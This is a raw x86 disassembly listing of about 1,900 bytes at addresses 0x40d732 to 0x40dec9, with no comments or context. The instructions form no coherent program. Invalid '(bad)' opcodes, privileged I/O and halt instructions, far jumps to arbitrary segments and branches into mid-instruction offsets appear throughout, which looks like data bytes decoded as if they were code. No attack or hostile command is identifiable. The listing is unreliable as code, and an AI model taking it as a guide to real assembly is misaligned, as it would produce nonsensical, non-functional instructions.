  40d732:	pop    edi
  40d733:	dec    ebx
  40d734:	xchg   BYTE PTR [ecx-0x6c56389d],cl
  40d73a:	test   DWORD PTR [ecx+esi*4-0x54859adc],eax
  40d741:	ss xchg ch,dh
  40d744:	xor    ch,BYTE PTR [eax-0x4a]
  40d747:	scas   al,BYTE PTR es:[edi]
  40d748:	and    al,0x9
  40d74a:	mov    ebx,0x5d8b792d
  40d74f:	xchg   esp,eax
  40d750:	popa   
  40d751:	push   0x2e
  40d753:	shl    DWORD PTR [edi],cl
  40d755:	add    bh,BYTE PTR [ecx]
  40d757:	mov    ah,0x8f
  40d759:	push   eax
  40d75a:	sahf   
  40d75b:	sub    cl,al
  40d75d:	test   DWORD PTR [edx-0x40891b44],ecx
  40d763:	mov    cl,0x68
  40d765:	ins    BYTE PTR es:[edi],dx
  40d766:	bound  esi,QWORD PTR [edi-0x2c9f53bd]
  40d76c:	aad    0xb5
  40d76e:	jecxz  0x40d76b
  40d770:	jge    0x40d795
  40d772:	add    BYTE PTR [ecx],cl
  40d774:	push   eax
  40d775:	rcr    edx,0x8a
  40d778:	push   ebp
  40d779:	sbb    ax,0x230b
  40d77d:	push   es
  40d77e:	sub    DWORD PTR [ebx+0x1c92f658],esi
  40d784:	pop    esi
  40d785:	idiv   BYTE PTR [edx]
  40d787:	jmp    0x82a1:0x95c05fea
  40d78e:	jl     0x40d761
  40d790:	sbb    eax,0xdf44f62
  40d795:	outs   dx,BYTE PTR ds:[esi]
  40d796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d797:	jae    0x40d7c5
  40d799:	sub    al,0x61
  40d79b:	mov    ah,BYTE PTR [eax-0x28]
  40d79e:	imul   esi,DWORD PTR [esi-0xbdcaaae],0xffffff9a
  40d7a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7a6:	mov    esi,0x7fca6e01
  40d7ab:	mov    edi,0xfd6b6c7b
  40d7b0:	mov    WORD PTR [edx],gs
  40d7b2:	ins    DWORD PTR es:[edi],dx
  40d7b3:	jo     0x40d785
  40d7b5:	dec    esp
  40d7b6:	add    al,bl
  40d7b8:	pusha  
  40d7b9:	xchg   esi,eax
  40d7ba:	retf   0x8f1d
  40d7bd:	xchg   edi,eax
  40d7be:	add    eax,0x7aba320c
  40d7c3:	xlat   BYTE PTR ds:[ebx]
  40d7c4:	jno    0x40d74e
  40d7c6:	jge    0x40d7ea
  40d7c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7c9:	mov    al,BYTE PTR [eax-0x74]
  40d7cc:	jge    0x40d751
  40d7ce:	test   DWORD PTR [ecx+ebp*1-0x72],esp
  40d7d2:	jmp    0x1dc0:0x2a3c2b9
  40d7d9:	jb     0x40d764
  40d7db:	xchg   edx,eax
  40d7dc:	int    0x2
  40d7de:	nop
  40d7df:	mov    cl,0x9b
  40d7e1:	mov    ebx,0xf6f669ad
  40d7e6:	das    
  40d7e7:	xchg   DWORD PTR [ecx+0x126cf99b],ebx
  40d7ed:	xchg   edx,eax
  40d7ee:	hlt    
  40d7ef:	imul   ebx,DWORD PTR [eax-0x69],0xa33dff51
  40d7f6:	mov    cl,0x4
  40d7f8:	std    
  40d7f9:	push   es
  40d7fa:	mov    eax,0x38cb9a16
  40d7ff:	xchg   esp,eax
  40d800:	aaa    
  40d801:	mov    ebp,0x59c3f2cf
  40d806:	stos   BYTE PTR es:[edi],al
  40d807:	imul   edi,DWORD PTR [ebx+edi*1],0x4ebd875e
  40d80e:	mov    eax,ss:0x4ab315e2
  40d814:	mov    esi,0x7bb72b34
  40d819:	mov    edx,0x86e7f8b5
  40d81e:	push   ds
  40d81f:	mov    ebx,0xe0498c85
  40d824:	ss aas 
  40d826:	stc    
  40d827:	inc    ebp
  40d828:	popa   
  40d829:	dec    ebp
  40d82a:	call   0xb10e7042
  40d82f:	mov    edx,0x7253956e
  40d834:	sbb    cl,0x41
  40d837:	jne    0x40d7cc
  40d839:	mov    dh,0x46
  40d83b:	jl     0x40d886
  40d83d:	mov    eax,0x41302875
  40d842:	push   eax
  40d843:	test   al,0xa7
  40d845:	mov    ds:0x7b5f5542,eax
  40d84a:	xchg   edi,eax
  40d84b:	test   DWORD PTR [ebx-0x58d5adf8],esi
  40d851:	xor    esp,esi
  40d853:	pcmpgtb mm3,QWORD PTR [edi]
  40d856:	fiadd  DWORD PTR [edi]
  40d858:	out    0xbf,al
  40d85a:	sbb    al,0xf5
  40d85c:	dec    edi
  40d85d:	dec    ebx
  40d85e:	addr16 popa 
  40d860:	(bad)  [ebp+edx*8-0x112fda4]
  40d867:	push   cs
  40d868:	mov    al,ds:0x1a93d6fe
  40d86d:	push   ss
  40d86e:	ret    
  40d86f:	or     al,0xe8
  40d871:	leave  
  40d872:	mov    ecx,0x707625e6
  40d877:	out    0xda,eax
  40d879:	sar    BYTE PTR [edi*4-0x4e4afa40],1
  40d880:	aad    0x36
  40d882:	sar    edx,cl
  40d884:	cmp    dl,BYTE PTR [ecx-0x25a513e3]
  40d88a:	aam    0x75
  40d88c:	call   0x1502:0xb4cafb8a
  40d893:	sub    bl,BYTE PTR [ebp+0x44]
  40d896:	dec    ecx
  40d897:	gs mov eax,0x9163b6f1
  40d89d:	std    
  40d89e:	sbb    BYTE PTR ds:0xe6265907,ch
  40d8a4:	pop    eax
  40d8a5:	mov    eax,eax
  40d8a7:	in     al,0x71
  40d8a9:	add    DWORD PTR [esp+esi*4+0x2f08fed6],0xffffffcc
  40d8b1:	jecxz  0x40d8c5
  40d8b3:	mov    cl,BYTE PTR [esi-0x1e]
  40d8b6:	cmc    
  40d8b7:	cdq    
  40d8b8:	and    WORD PTR [esi+0x7ae6e61d],si
  40d8bf:	xchg   ecx,eax
  40d8c0:	push   eax
  40d8c1:	pop    ebp
  40d8c2:	and    DWORD PTR [edi+0x38af65e8],0xfb2d4bb
  40d8cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8cd:	xor    esi,DWORD PTR [ebp+0x518482cd]
  40d8d3:	test   eax,0x55247a98
  40d8d8:	mov    ebx,0xa0762fe2
  40d8dd:	mov    ebx,0x48ea61f0
  40d8e2:	in     eax,0x5e
  40d8e4:	push   ss
  40d8e5:	dec    edx
  40d8e6:	push   ecx
  40d8e7:	jae    0x40d912
  40d8e9:	cmc    
  40d8ea:	neg    BYTE PTR [edx-0x12]
  40d8ed:	jae    0x40d962
  40d8ef:	pusha  
  40d8f0:	call   0x6d61c497
  40d8f5:	xor    DWORD PTR [ebx-0x2ae55323],0x4f37cad1
  40d8ff:	bound  esp,QWORD PTR [ecx]
  40d901:	jnp    0x40d974
  40d903:	sar    DWORD PTR [esi-0x2b59f40d],0xcc
  40d90a:	dec    eax
  40d90b:	(bad)  
  40d90c:	dec    eax
  40d90d:	nop
  40d90e:	in     eax,dx
  40d90f:	ror    BYTE PTR [edi+edi*8+0x37ca8063],cl
  40d916:	pop    ebp
  40d917:	push   cs
  40d918:	mov    ebx,0x54e89318
  40d91d:	daa    
  40d91e:	mov    dh,0xe5
  40d920:	xlat   BYTE PTR ds:[ebx]
  40d921:	cmp    BYTE PTR [esp+edi*1-0x48],bl
  40d925:	and    edx,DWORD PTR [eax-0x63bed140]
  40d92b:	aam    0x3b
  40d92d:	adc    edx,edi
  40d92f:	sti    
  40d930:	jmp    0xf6d03c02
  40d935:	lock mov esp,0x17d86c2
  40d93b:	bound  eax,QWORD PTR [esi+ebp*1-0x4259433]
  40d942:	int    0x71
  40d944:	jmp    0xe5cc3b6
  40d949:	jg     0x40d8cd
  40d94b:	popa   
  40d94c:	retf   0x4331
  40d94f:	add    eax,0xbd800956
  40d954:	dec    esi
  40d955:	mov    dl,BYTE PTR [edi]
  40d957:	clc    
  40d958:	xchg   ebp,eax
  40d959:	push   ecx
  40d95a:	pop    es
  40d95b:	fcom   DWORD PTR [esi]
  40d95d:	xor    DWORD PTR [edx+0x6c],ebp
  40d960:	out    0x5b,al
  40d962:	xchg   edx,eax
  40d963:	neg    BYTE PTR [ebp-0x2f]
  40d966:	mov    esp,DWORD PTR [ecx-0x6c]
  40d969:	mov    dh,0xa9
  40d96b:	gs mov dh,0x74
  40d96e:	and    al,BYTE PTR [ebx+0x5d]
  40d971:	jmp    0x25de:0x8dd8aea7
  40d978:	fwait
  40d979:	adc    ah,BYTE PTR [edx]
  40d97b:	ret    
  40d97c:	mov    ebp,0x325b9c87
  40d981:	jo     0x40d979
  40d983:	sar    DWORD PTR [ecx+0x2c08b7ba],1
  40d989:	jmp    0x40d9f0
  40d98b:	add    BYTE PTR [ebx+0x211e5499],ah
  40d991:	xchg   esi,eax
  40d992:	xor    dh,BYTE PTR es:[eax+0x21]
  40d996:	push   cs
  40d997:	pop    es
  40d998:	sbb    al,BYTE PTR [esi]
  40d99a:	mov    ds:0x9776086a,eax
  40d99f:	push   ds
  40d9a0:	push   edx
  40d9a1:	(bad)  
  40d9a2:	push   ds
  40d9a3:	leave  
  40d9a4:	push   cs
  40d9a5:	(bad)  
  40d9a6:	(bad)  [edx]
  40d9a8:	mov    fs,WORD PTR [edx+eiz*2]
  40d9ab:	fnstsw WORD PTR [ecx]
  40d9ad:	adc    DWORD PTR [edi+0x6e95e9ba],ecx
  40d9b3:	xor    eax,0xe877c47f
  40d9b8:	sbb    cl,bl
  40d9ba:	les    ebp,FWORD PTR [edi+edi*8+0xe4702c7]
  40d9c1:	lea    edi,ds:0x43704e0b
  40d9c7:	outs   dx,BYTE PTR ds:[esi]
  40d9c8:	mov    eax,0x1902e423
  40d9cd:	retf   
  40d9ce:	fwait
  40d9cf:	outs   dx,DWORD PTR ds:[esi]
  40d9d0:	pop    edi
  40d9d1:	out    0x22,eax
  40d9d3:	mov    ch,0xe4
  40d9d5:	pop    ds
  40d9d6:	repnz dec ebx
  40d9d8:	add    al,0x1e
  40d9da:	in     al,0x4d
  40d9dc:	sbb    ah,BYTE PTR [eax+0x778fa646]
  40d9e2:	mov    ecx,0xead62478
  40d9e7:	data16 mov al,ds:0xa57db7cc
  40d9ed:	dec    esp
  40d9ee:	adc    BYTE PTR [esi+ebp*4],bl
  40d9f1:	push   ds
  40d9f2:	mov    dl,0xa1
  40d9f4:	xor    al,0xee
  40d9f6:	fist   DWORD PTR [esi-0x78]
  40d9f9:	ins    BYTE PTR es:[edi],dx
  40d9fa:	jb     0x40da53
  40d9fc:	mov    edx,DWORD PTR [esi-0x3cf4735d]
  40da02:	pop    ds
  40da03:	ror    DWORD PTR [eax],1
  40da05:	push   edx
  40da06:	sbb    al,0xbe
  40da08:	jecxz  0x40da12
  40da0a:	popa   
  40da0b:	push   0x3b
  40da0d:	ins    BYTE PTR es:[edi],dx
  40da0e:	jp     0x40d9bf
  40da10:	imul   edx,DWORD PTR [ebp-0x63],0xffffff9b
  40da14:	mov    cl,0xd0
  40da16:	loop   0x40d9f3
  40da18:	dec    ebx
  40da19:	daa    
  40da1a:	outs   dx,DWORD PTR ds:[esi]
  40da1b:	std    
  40da1c:	xor    eax,0x4d2005a7
  40da21:	data16 test al,0x77
  40da24:	or     BYTE PTR [ecx],cl
  40da26:	sbb    dh,bh
  40da28:	out    0x7d,al
  40da2a:	inc    esi
  40da2b:	sub    ebp,eax
  40da2d:	(bad)  
  40da2e:	pop    ss
  40da2f:	pop    esp
  40da30:	lea    edx,[ecx-0x3f]
  40da33:	xchg   esp,eax
  40da34:	mov    edx,0xc068af5d
  40da39:	push   es
  40da3a:	test   eax,0x7c0e8318
  40da3f:	inc    edx
  40da40:	sbb    DWORD PTR [edi],esp
  40da42:	jns    0x40dabc
  40da44:	into   
  40da45:	mov    edx,edi
  40da47:	pop    ecx
  40da48:	jp     0x40dac9
  40da4a:	pop    ebp
  40da4b:	mov    edi,0x160c67d7
  40da50:	out    dx,eax
  40da51:	xlat   BYTE PTR ds:[ebx]
  40da52:	sbb    al,0xf9
  40da54:	jmp    0x40da82
  40da56:	sti    
  40da57:	fild   DWORD PTR [ebx+eax*1]
  40da5a:	pop    ss
  40da5b:	fstp   QWORD PTR [ecx+0xb]
  40da5e:	test   eax,0x7d8df5ff
  40da63:	adc    eax,DWORD PTR [eax-0x29]
  40da66:	mov    dh,0x5f
  40da68:	and    eax,0x37e49588
  40da6d:	mov    al,0xab
  40da6f:	shr    BYTE PTR [edi-0x59],0x87
  40da73:	mov    ah,0xd3
  40da75:	and    DWORD PTR [esi+eax*8],ecx
  40da78:	add    al,0x91
  40da7a:	sub    eax,eax
  40da7c:	sub    al,0xf8
  40da7e:	mov    ebp,DWORD PTR [esi-0x4ddd287e]
  40da84:	out    dx,eax
  40da85:	icebp  
  40da86:	push   0xae32a179
  40da8b:	cli    
  40da8c:	and    eax,0x8820dabf
  40da91:	fstp   DWORD PTR [esi+0x1c]
  40da94:	mov    edi,0xe8929abb
  40da99:	dec    ebp
  40da9a:	mov    cs,WORD PTR [edi]
  40da9c:	push   ebx
  40da9d:	outs   dx,BYTE PTR ds:[esi]
  40da9e:	or     BYTE PTR [edx-0x7b],al
  40daa1:	cmp    ebx,DWORD PTR [edi]
  40daa3:	dec    esi
  40daa4:	xchg   BYTE PTR [ebx],bh
  40daa6:	xor    esi,DWORD PTR [ebx+0x54]
  40daa9:	mov    DWORD PTR [ebx],ecx
  40daab:	dec    eax
  40daac:	mov    edx,0x687da971
  40dab1:	mov    cl,0xe4
  40dab3:	mov    ah,0x20
  40dab5:	jmp    0x14b2:0xf4e12eb
  40dabc:	repnz cs dec ebp
  40dabf:	test   DWORD PTR ds:0xa2a6bd50,eax
  40dac5:	cmp    al,0x27
  40dac7:	and    BYTE PTR [esi+ebp*1-0x430c04b0],dl
  40dace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dacf:	and    DWORD PTR [ebx+0x6c],ecx
  40dad2:	jne    0x40da62
  40dad4:	sbb    eax,0xa3769fce
  40dad9:	mov    ecx,0x6f305e51
  40dade:	std    
  40dadf:	ficom  DWORD PTR [edi+eax*1+0x50fdcd81]
  40dae6:	popf   
  40dae7:	dec    edi
  40dae8:	mov    eax,ds:0xd77c307e
  40daed:	test   bh,cl
  40daef:	cdq    
  40daf0:	sbb    ch,al
  40daf2:	lea    esi,[eax+ebx*4-0x6d2332f1]
  40daf9:	lea    edi,[ebp-0x261b4e89]
  40daff:	cli    
  40db00:	out    dx,al
  40db01:	xchg   edi,eax
  40db02:	sub    DWORD PTR [eax],ecx
  40db04:	jecxz  0x40da94
  40db06:	mov    ecx,0x39b1b430
  40db0b:	imul   eax,eax,0xfffffff1
  40db0e:	outs   dx,DWORD PTR ds:[esi]
  40db0f:	add    DWORD PTR [ecx+0x64],ecx
  40db12:	sbb    al,0xfc
  40db14:	and    ecx,DWORD PTR [eax-0x18]
  40db17:	es jns 0x40daf1
  40db1a:	dec    ebp
  40db1b:	sbb    eax,0xd1ed87fd
  40db20:	fbld   TBYTE PTR [edi-0x51]
  40db23:	(bad)  
  40db24:	cwde   
  40db25:	sub    BYTE PTR [edx+0x2d37e147],ch
  40db2b:	mov    bh,0xed
  40db2d:	and    al,0x95
  40db2f:	xchg   edi,eax
  40db30:	inc    eax
  40db31:	add    al,0x32
  40db33:	xchg   esp,eax
  40db34:	popf   
  40db35:	out    dx,eax
  40db36:	sbb    eax,0x7ad22072
  40db3b:	popf   
  40db3c:	fs sbb ecx,ebp
  40db3f:	sbb    DWORD PTR [ecx-0x47899486],edi
  40db45:	out    dx,eax
  40db46:	xchg   esi,eax
  40db47:	je     0x40db18
  40db49:	dec    ecx
  40db4a:	dec    edi
  40db4b:	repnz mov dh,0xf9
  40db4e:	or     edx,DWORD PTR [edx]
  40db50:	leave  
  40db51:	push   0x38038d8e
  40db56:	sbb    al,0x77
  40db58:	adc    DWORD PTR [edx+edx*8+0x75],ebx
  40db5c:	rcl    BYTE PTR [eax-0x24bc7d97],cl
  40db62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db63:	std    
  40db64:	sysenter 
  40db66:	in     al,dx
  40db67:	pop    esp
  40db68:	inc    edi
  40db69:	call   0xe088:0x1c8cdd9d
  40db70:	inc    edi
  40db71:	arpl   ax,bx
  40db73:	stos   BYTE PTR es:[edi],al
  40db74:	std    
  40db75:	(bad)  
  40db76:	mov    ds,WORD PTR [edx-0x77]
  40db79:	popa   
  40db7a:	aam    0xdb
  40db7c:	rcr    DWORD PTR [esp+ebp*1+0x1f],cl
  40db80:	sub    ebx,DWORD PTR [esi]
  40db82:	rol    BYTE PTR [esi+0x624e849d],0xcb
  40db89:	xchg   edi,eax
  40db8a:	test   al,0x9f
  40db8c:	add    BYTE PTR [ebx],dl
  40db8e:	inc    eax
  40db8f:	ret    0x137c
  40db92:	and    eax,0x3ef5ef62
  40db97:	dec    ecx
  40db98:	je     0x40db64
  40db9a:	mov    esi,0x8803f77d
  40db9f:	adc    BYTE PTR [ecx+ecx*8-0x6d],ah
  40dba3:	or     DWORD PTR [edi-0x2e],ebp
  40dba6:	xchg   edi,eax
  40dba7:	in     eax,dx
  40dba8:	lods   al,BYTE PTR ds:[esi]
  40dba9:	push   0x258d087d
  40dbae:	push   ecx
  40dbaf:	lods   eax,DWORD PTR ds:[esi]
  40dbb0:	dec    ebx
  40dbb1:	jae    0x40db60
  40dbb3:	lock xor ebp,ebx
  40dbb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbb7:	sub    BYTE PTR [edi],0x1c
  40dbba:	aaa    
  40dbbb:	pushf  
  40dbbc:	call   DWORD PTR [ebx-0x45]
  40dbbf:	jno    0x40db71
  40dbc1:	jecxz  0x40dbcc
  40dbc3:	cmp    BYTE PTR [ebx-0x624fa60d],0x95
  40dbca:	(bad)  
  40dbcb:	sar    bh,1
  40dbcd:	(bad)  
  40dbce:	ds jns 0x40dba8
  40dbd1:	ins    BYTE PTR es:[edi],dx
  40dbd2:	mov    ecx,0x6f04644c
  40dbd7:	xchg   esp,eax
  40dbd8:	into   
  40dbd9:	push   edi
  40dbda:	addr16 lahf 
  40dbdc:	jl     0x40db82
  40dbde:	out    dx,al
  40dbdf:	add    esi,DWORD PTR [esi-0x64]
  40dbe2:	icebp  
  40dbe3:	enter  0x3595,0xa4
  40dbe7:	call   0x39d6:0x35937dae
  40dbee:	bswap  eax
  40dbf0:	rol    BYTE PTR [edi],1
  40dbf2:	aam    0xbe
  40dbf4:	cmp    al,0x40
  40dbf6:	and    eax,0xa7859c7
  40dbfb:	pop    eax
  40dbfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbfd:	and    al,bh
  40dbff:	je     0x40dba9
  40dc01:	jns    0x666f27df
  40dc07:	ins    DWORD PTR es:[edi],dx
  40dc08:	lea    edi,cs:[esi+0x61]
  40dc0c:	adc    BYTE PTR [edi],bh
  40dc0e:	sub    cl,0x1
  40dc11:	pop    ebp
  40dc12:	dec    ebx
  40dc13:	ror    DWORD PTR [ebp+0x6a167a80],0xb
  40dc1a:	in     al,0x50
  40dc1c:	aad    0x4b
  40dc1e:	cmp    al,0xf4
  40dc20:	stos   BYTE PTR es:[edi],al
  40dc21:	mov    esp,0xdb42b13c
  40dc26:	push   ss
  40dc27:	std    
  40dc28:	adc    esi,DWORD PTR [ebp-0x9a01283]
  40dc2e:	push   ecx
  40dc2f:	jb     0x40dbc1
  40dc31:	and    DWORD PTR [edx-0x1d],esi
  40dc34:	pop    ds
  40dc35:	adc    BYTE PTR [eax+eiz*1+0x5f],0x1c
  40dc3a:	cld    
  40dc3b:	xchg   esi,eax
  40dc3c:	add    BYTE PTR [ecx+0x2c99d75],0x8d
  40dc43:	nop
  40dc44:	loop   0x40dc1e
  40dc46:	mov    al,ds:0x165d9ada
  40dc4b:	call   0x47574c6c
  40dc50:	sti    
  40dc51:	jbe    0x40dccb
  40dc53:	mov    edx,0x629f2177
  40dc58:	cmp    BYTE PTR [edx-0x530fb860],0x5c
  40dc5f:	imul   ebp,DWORD PTR [esi-0x7d],0x47
  40dc63:	test   al,0xf8
  40dc65:	mov    dh,0xe
  40dc67:	call   0xb9412a3c
  40dc6c:	xor    eax,0xe0aa53fb
  40dc71:	adc    al,0x71
  40dc73:	imul   edx,DWORD PTR [esp+eiz*2-0x751cf146],0x4235c608
  40dc7e:	shl    esp,1
  40dc80:	mov    ecx,edi
  40dc82:	clc    
  40dc83:	sbb    DWORD PTR [edi-0x22ea31b],0x4f
  40dc8a:	jmp    0x40dc6e
  40dc8c:	test   DWORD PTR [ecx-0x5cc525c0],edi
  40dc92:	sbb    eax,0x437670b4
  40dc97:	mov    cl,0x58
  40dc99:	mov    ds:0xb2915f3e,eax
  40dc9e:	and    ebp,edx
  40dca0:	or     al,0x7b
  40dca2:	rcl    dl,1
  40dca4:	rcr    BYTE PTR [edi-0xc],0xc6
  40dca8:	mov    dh,0xe3
  40dcaa:	mov    WORD PTR [esi-0x2c],ds
  40dcad:	(bad)  
  40dcae:	lds    ebx,FWORD PTR [esi-0xc]
  40dcb1:	mov    ah,0xc5
  40dcb3:	aam    0x31
  40dcb5:	mov    di,0x49cd
  40dcb9:	lea    esp,[eax-0x68]
  40dcbc:	into   
  40dcbd:	pop    ebp
  40dcbe:	push   ss
  40dcbf:	xor    dh,dh
  40dcc1:	mov    dl,0x92
  40dcc3:	mov    esi,0x7e24c0c7
  40dcc8:	xor    BYTE PTR [ebp+edi*4+0x15],0xf7
  40dccd:	sbb    DWORD PTR [edi+0x76863c4d],ebx
  40dcd3:	jo     0x40dcd3
  40dcd5:	add    BYTE PTR [edx-0x16f955ad],0xe3
  40dcdc:	cmp    eax,DWORD PTR [eax-0x4]
  40dcdf:	mov    dl,0x63
  40dce1:	or     ebx,DWORD PTR [edx+0x40c53925]
  40dce7:	pusha  
  40dce8:	imul   ecx,DWORD PTR [edi],0x12
  40dceb:	pop    eax
  40dcec:	out    dx,al
  40dced:	push   0x3e
  40dcef:	aaa    
  40dcf0:	call   0x5afd52b8
  40dcf5:	stos   DWORD PTR es:[edi],eax
  40dcf6:	adc    dl,bl
  40dcf8:	mov    ah,BYTE PTR [eax-0x3da339f1]
  40dcfe:	fwait
  40dcff:	sbb    BYTE PTR [eax-0x50],ch
  40dd02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd03:	add    eax,0x2f404f13
  40dd08:	jl     0x40dd04
  40dd0a:	repnz out 0xcd,al
  40dd0d:	mov    ecx,0x9cd1eca5
  40dd12:	adc    eax,0xbaf83bab
  40dd17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd18:	mov    edi,0x3f8a1c9
  40dd1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd1e:	sbb    dl,0xe3
  40dd21:	cmp    eax,0xcf6845f5
  40dd26:	sub    BYTE PTR [esi],dl
  40dd28:	mov    eax,0x8d74abb1
  40dd2d:	arpl   WORD PTR [eax],dx
  40dd2f:	outs   dx,BYTE PTR ds:[esi]
  40dd30:	and    DWORD PTR [edx],esi
  40dd32:	mov    ebp,DWORD PTR [esi]
  40dd34:	pop    es
  40dd35:	jl     0x40dd0d
  40dd37:	cmp    ebp,ebx
  40dd39:	lea    edi,[edi]
  40dd3b:	scas   eax,DWORD PTR es:[edi]
  40dd3c:	(bad)  
  40dd3d:	lock sub eax,0x7b4e6c59
  40dd43:	add    cl,ch
  40dd45:	rcr    BYTE PTR [eax-0x20],cl
  40dd48:	mov    eax,ds:0x722f5252
  40dd4d:	dec    edx
  40dd4e:	ss push cs
  40dd50:	scas   eax,DWORD PTR es:[edi]
  40dd51:	cld    
  40dd52:	aas    
  40dd53:	fisttp QWORD PTR [edi]
  40dd55:	fmul   st,st(5)
  40dd57:	and    eax,0xaccf747a
  40dd5c:	shl    BYTE PTR [ebx],0xd3
  40dd5f:	mov    eax,ds:0x1c246a85
  40dd64:	in     al,dx
  40dd65:	loope  0x40dda1
  40dd67:	out    0x0,eax
  40dd69:	adc    eax,0xf1155a5a
  40dd6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd6f:	dec    edi
  40dd70:	in     al,0xf
  40dd72:	enter  0x1acb,0xf2
  40dd76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd77:	jecxz  0x40ddbe
  40dd79:	mov    al,0xcc
  40dd7b:	stos   DWORD PTR es:[edi],eax
  40dd7c:	or     DWORD PTR [eax],edx
  40dd7e:	dec    esi
  40dd7f:	jmp    0xc8dc032
  40dd84:	push   edx
  40dd85:	xchg   edi,eax
  40dd86:	jge    0x40dd74
  40dd88:	ret    
  40dd89:	jecxz  0x40dde2
  40dd8b:	ror    DWORD PTR [esi],cl
  40dd8d:	test   DWORD PTR [ebp+0x2e],esi
  40dd90:	les    ebp,FWORD PTR [ebx+0x3f]
  40dd93:	scas   eax,DWORD PTR es:[edi]
  40dd94:	push   cs
  40dd95:	jbe    0x40dd95
  40dd97:	pop    eax
  40dd98:	and    DWORD PTR [esi-0x3930d789],esi
  40dd9e:	(bad)  
  40dd9f:	xchg   edi,eax
  40dda0:	jmp    0x45e:0xe2ec8933
  40dda7:	aas    
  40dda8:	xor    ebp,DWORD PTR [eax-0x6974ab6a]
  40ddae:	mov    dh,0x36
  40ddb0:	mov    ebx,0x583945bf
  40ddb5:	lods   eax,DWORD PTR ds:[esi]
  40ddb6:	xchg   esp,eax
  40ddb7:	adc    esi,edx
  40ddb9:	mov    ebp,0x2ae2b9db
  40ddbe:	inc    ecx
  40ddbf:	sahf   
  40ddc0:	bound  eax,QWORD PTR [esi+0x59814aef]
  40ddc6:	push   ebp
  40ddc7:	or     BYTE PTR [edi+0x30],bh
  40ddca:	test   esp,ebx
  40ddcc:	mov    ebp,0x6a6e0439
  40ddd1:	lea    esi,[ecx+ebx*1]
  40ddd4:	pop    esi
  40ddd5:	xchg   esp,eax
  40ddd6:	sub    BYTE PTR [esi+ebp*2],dl
  40ddd9:	cld    
  40ddda:	jo     0x40ddfc
  40dddc:	out    dx,eax
  40dddd:	cmp    edi,DWORD PTR [ebx-0x4d]
  40dde0:	pop    ecx
  40dde1:	jecxz  0x40de3a
  40dde3:	js     0x40ddc1
  40dde5:	pop    ds
  40dde6:	mov    DWORD PTR [esi],edx
  40dde8:	(bad)
  40ddeb:	int3   
  40ddec:	not    BYTE PTR [bx+di-0x72]
  40ddf0:	mov    es,WORD PTR ds:0xce517518
  40ddf6:	mov    fs,WORD PTR [ebx]
  40ddf8:	pop    edi
  40ddf9:	sub    bh,BYTE PTR [ebp-0xa]
  40ddfc:	loop   0x40de28
  40ddfe:	push   0xffffffad
  40de00:	jae    0x40ddd5
  40de02:	fstp   QWORD PTR [edx-0x53]
  40de05:	out    dx,eax
  40de06:	xor    ah,BYTE PTR [esi]
  40de08:	push   ecx
  40de09:	sbb    cl,BYTE PTR [esi]
  40de0b:	adc    BYTE PTR ds:0xc9680f39,bh
  40de11:	data16 repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de14:	jmp    0x40de33
  40de16:	push   edi
  40de17:	mov    BYTE PTR [edi-0x53740c54],bh
  40de1d:	or     eax,ebp
  40de1f:	sub    esp,DWORD PTR [esi]
  40de21:	xor    dl,BYTE PTR [esp+edx*8]
  40de24:	jp     0x40de12
  40de26:	(bad)  
  40de28:	(bad)  
  40de29:	std    
  40de2a:	loope  0x40de11
  40de2c:	inc    eax
  40de2d:	mov    ecx,0xb07884e1
  40de32:	cld    
  40de33:	pop    ecx
  40de34:	repz imul ecx,DWORD PTR [eax-0x21],0xffffffc8
  40de39:	lods   eax,DWORD PTR ds:[esi]
  40de3a:	mov    BYTE PTR [edi-0x622870ae],ah
  40de40:	mov    cl,0x84
  40de42:	cwde   
  40de43:	jl     0x40dec3
  40de45:	cmp    DWORD PTR [edi-0x76],0x937946bb
  40de4c:	adc    ebp,DWORD PTR [esi+0x31]
  40de4f:	jmp    0x40de89
  40de51:	adc    DWORD PTR [ebx+0x251fab84],0x65
  40de58:	dec    ebp
  40de59:	push   ss
  40de5a:	rcr    BYTE PTR [edi],0xe9
  40de5d:	arpl   WORD PTR ds:0x66a24f31,cx
  40de63:	retf   0x7fd0
  40de66:	int3   
  40de67:	and    DWORD PTR [eax+ecx*1],eax
  40de6a:	cwde   
  40de6b:	int3   
  40de6c:	pop    DWORD PTR [edi-0x687a6dd]
  40de72:	cwde   
  40de73:	shl    dl,0xa7
  40de76:	leave  
  40de77:	mov    bl,BYTE PTR [ebx]
  40de79:	adc    al,BYTE PTR [edi-0xa]
  40de7c:	clc    
  40de7d:	pop    esp
  40de7e:	fist   DWORD PTR [esi+ebp*8-0x59]
  40de82:	and    al,0x6b
  40de84:	cs stos DWORD PTR es:[edi],eax
  40de86:	test   al,0xb3
  40de88:	jae    0x40de1e
  40de8a:	dec    edi
  40de8b:	xchg   esi,eax
  40de8c:	ret    
  40de8d:	xchg   ebp,eax
  40de8e:	xor    esi,ecx
  40de90:	sub    eax,0x1537375
  40de95:	test   DWORD PTR [ecx-0x2c3aa9f0],eax
  40de9b:	scas   eax,DWORD PTR es:[edi]
  40de9c:	shl    DWORD PTR [eax+esi*8-0x20cf36c6],1
  40dea3:	adc    eax,0x8fe1c1f0
  40dea8:	fs pop ecx
  40deaa:	mov    BYTE PTR [edx],dh
  40deac:	xor    cl,dh
  40deae:	cld    
  40deaf:	das    
  40deb0:	mov    ah,bl
  40deb2:	hlt    
  40deb3:	dec    esp
  40deb4:	lea    eax,[edx-0x1b246c09]
  40deba:	dec    edi
  40debb:	sbb    dl,BYTE PTR [eax+ecx*8]
  40debe:	les    ebx,FWORD PTR [esi]
  40dec0:	aad    0xf3
  40dec2:	add    BYTE PTR [ebx+esi*8-0x1304bf46],dh
  40dec9:	xor    bh,BYTE PTR [eax+edx*2]
